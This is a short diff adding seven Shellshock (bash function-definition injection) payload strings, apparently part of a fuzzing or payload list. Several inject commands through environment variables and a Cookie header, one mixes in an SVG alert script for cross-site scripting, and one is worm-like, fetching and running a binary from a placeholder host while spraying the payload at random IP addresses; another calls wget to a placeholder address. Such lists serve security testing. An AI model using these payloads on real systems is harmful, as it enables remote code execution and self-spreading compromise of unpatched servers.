@@ -1,0 +1,7 @@
+() {<svg onload="alert(1)"> {')' "(</svg>" {& }; echo -e "header\x3axss
+env x='() { :;}; apt-get update && apt-get install --only-upgrade bash' bash -c "Oops."
+s='() { .;};wget x.x.x.x/WORM;chmod +x WORM;./WORM';while true;do wget $[RANDOM%255].$[RANDOM%255].$[RANDOM%255].$[RANDOM%255] -U'$s';done
+env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
+foo='() { echo "hi mom"; }' bash -c 'foo'
+Cookie: () { echo "Hello world"; }
+() { :;}; /bin/bash -c \"wget http://a.b.c.d/bash-count.txt\"
